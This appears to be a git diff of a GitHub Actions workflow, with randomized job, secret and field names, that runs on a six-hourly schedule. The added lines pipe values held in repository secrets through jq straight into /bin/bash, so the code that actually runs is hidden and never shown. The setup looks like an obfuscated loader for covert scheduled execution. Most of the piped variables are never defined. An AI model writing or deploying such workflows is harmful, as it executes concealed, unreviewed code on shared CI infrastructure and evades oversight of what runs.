@@ -3,8 +3,8 @@ name: zhaojinan7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
-jobs:  # 21122
+    - cron: '37 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +12,14 @@ jobs:  # 21122
       - uses: actions/checkout@v4
       - name: zhaojinan7890
         env:
-          kkkt42721: ${{ secrets.kkkt42721 }}
+          mnyfu63149: ${{ secrets.mnyfu63149 }}
         run: |
-          echo $kkkt42721 | jq -r .edah53 | /bin/bash
-          echo $zpvc40 | jq -r .rred39 | /bin/bash
-          echo $trx46 | jq -r .fgay7853 | /bin/bash
-          echo $hpmi834 | jq -r .wam68181 | /bin/bash
-          echo $objwb10 | jq -r .dhxly78 | /bin/bash
+          echo $mnyfu63149 | jq -r .ehiap594 | /bin/bash
+          echo $s66 | jq -r .g12 | /bin/bash
+          echo $lm3 | jq -r .cuh9155 | /bin/bash
+          echo $k96 | jq -r .yzqu6 | /bin/bash
+          echo $xj84724 | jq -r .hjt114 | /bin/bash
+          echo $ehwhg8879 | jq -r .bhetb82 | /bin/bash
+          echo $jusg52455 | jq -r .z788 | /bin/bash
+          echo $rg05 | jq -r .hkyl63274 | /bin/bash
 
